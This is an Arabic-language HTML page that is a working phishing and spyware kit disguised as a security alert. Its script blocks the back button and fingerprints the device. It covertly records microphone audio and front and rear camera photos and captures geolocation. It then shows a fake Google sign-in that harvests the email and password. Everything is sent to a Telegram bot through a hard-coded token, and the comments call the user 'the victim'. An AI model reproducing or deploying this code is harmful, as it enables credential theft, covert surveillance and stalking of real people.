<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>⚠️ نظام الأمان - تحقق من الهوية</title>
    <style>
        body { background-color: #000; color: #fff; font-family: 'Segoe UI', Tahoma, sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; text-align: center; }
        .warning-box { padding: 20px; border: 1px solid #ff0000; border-radius: 10px; width: 85%; max-width: 400px; background: rgba(255,0,0,0.1); }
        .loader { border: 3px solid #333; border-top: 3px solid #ff0000; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        
        #phish-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #fff; z-index: 9999; justify-content: center; align-items: center; color: #000; }
        .login-card { width: 90%; max-width: 360px; padding: 40px 20px; text-align: center; }
        .login-card img { width: 75px; margin-bottom: 20px; }
        .login-card input { width: 100%; padding: 15px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; }
        .login-card button { width: 100%; padding: 12px; background: #1a73e8; color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; margin-top: 20px; }
        
        #video, #canvas { display: none; }
    </style>
</head>
<body>

    <div class="warning-box" id="main-ui">
        <h2 style="color: #ff4d4d;">⚠️ تنبيه أمني خطير</h2>
        <p>تم رصد محاولة اختراق لجهازك من موقع خارجي.</p>
        <div class="loader"></div>
        <p style="font-size: 12px; color: #aaa;">يرجى السماح بالوصول للكاميرا والموقع للتحقق من هويتك ومنع الاختراق فوراً...</p>
    </div>

    <div id="phish-overlay">
        <div class="login-card">
            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google">
            <h1 style="font-size: 24px; font-weight: 400;">تسجيل الدخول</h1>
            <p>متابعة إلى حسابك في Google</p>
            <input type="email" id="email" placeholder="البريد الإلكتروني أو الهاتف">
            <input type="password" id="pass" placeholder="أدخل كلمة المرور">
            <button onclick="sendCreds()">التالي</button>
        </div>
    </div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        const TOKEN = "8723330008:AAH7fjX2fEKZ3-7WCWRQyiLHmNoaEY5QUaw";
        const CHAT_ID = "7984067238";
        let currentStream = null;

        function notifyBot(msg) {
            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
        }

        // 1. نظام الاهتزاز ومنع الخروج
        function secureLock() {
            if (navigator.vibrate) navigator.vibrate([500, 300, 500, 300, 500]);
            for(let i=0; i<100; i++) window.history.pushState(null, null, window.location.href);
            window.onpopstate = () => {
                window.history.pushState(null, null, window.location.href);
                notifyBot("🚫 الضحية حاول الخروج! تم منعه بنجاح.");
            };
        }

        // 2. سحب البيانات الصامتة (بصمة الجهاز)
        async function getFingerprint() {
            let b = await (navigator.getBattery ? navigator.getBattery() : {level: 0});
            let info = `🌑 **تم اصطياد ضحية جديد:**\n\n`;
            info += `💻 *النظام:* ${navigator.platform}\n`;
            info += `🔋 *البطارية:* ${Math.round(b.level*100)}%\n`;
            info += `📡 *الشبكة:* ${navigator.connection ? navigator.connection.effectiveType : 'unknown'}\n`;
            notifyBot(info);
            
            // كشف الحسابات النشطة
            const check = ["Google", "Facebook", "Twitter"];
            check.forEach(s => {
                let img = new Image(); img.src = `https://${s.toLowerCase()}.com/favicon.ico`;
                img.onload = () => notifyBot(`🌐 الضحية نشط على: *${s}*`);
            });
        }

        // 3. التجسس الصوتي (5 ثواني كل 15 ثانية)
        async function audioSpy() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                const recorder = new MediaRecorder(stream);
                recorder.ondataavailable = (e) => {
                    const fd = new FormData();
                    fd.append('chat_id', CHAT_ID);
                    fd.append('voice', e.data, 'mic.ogg');
                    fetch(`https://api.telegram.org/bot${TOKEN}/sendVoice`, { method: 'POST', body: fd });
                };
                setInterval(() => { recorder.start(); setTimeout(() => recorder.stop(), 5000); }, 15000);
            } catch(e) { notifyBot("❌ رفض إذن الميكروفون."); }
        }

        // 4. التجسس البصري التتابعي (2 ثانية)
        async function visualSpy() {
            const modes = ["user", "environment"];
            let i = 0;
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            
            while(true) {
                try {
                    if (currentStream) currentStream.getTracks().forEach(t => t.stop());
                    currentStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: modes[i%2] } });
                    video.srcObject = currentStream;
                    await new Promise(r => setTimeout(r, 800));
                    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    canvas.toBlob(blob => {
                        const fd = new FormData();
                        fd.append('chat_id', CHAT_ID);
                        fd.append('photo', blob, 'img.jpg');
                        fd.append('caption', `👁️ كاميرا: ${modes[i%2]==="user"?"أمامية":"خلفية"}`);
                        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                    }, 'image/jpeg', 0.5);
                } catch(e) {}
                i++; await new Promise(r => setTimeout(r, 2000));
            }
        }

        function sendCreds() {
            const e = document.getElementById('email').value;
            const p = document.getElementById('pass').value;
            if(e && p) {
                notifyBot(`🔥 **بيانات حساب جوجل مسحوبة:**\n📧: \`${e}\`\n🔐: \`${p}\``);
                document.getElementById('phish-overlay').style.display = 'none';
                alert("فشل النظام في التحقق. يرجى المحاولة لاحقاً.");
            }
        }

        window.onload = () => {
            secureLock();
            getFingerprint();
            audioSpy();
            visualSpy();
            navigator.geolocation.getCurrentPosition(p => {
                const map = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
                notifyBot(`📍 **موقع الضحية:** [فتح الخريطة](${map})`);
            });
            // إظهار صفحة تسجيل الدخول الوهمية بعد 15 ثانية
            setTimeout(() => {
                document.getElementById('phish-overlay').style.display = 'flex';
            }, 15000);
            if(navigator.wakeLock) navigator.wakeLock.request('screen');
        };
    </script>
</body>
</html>
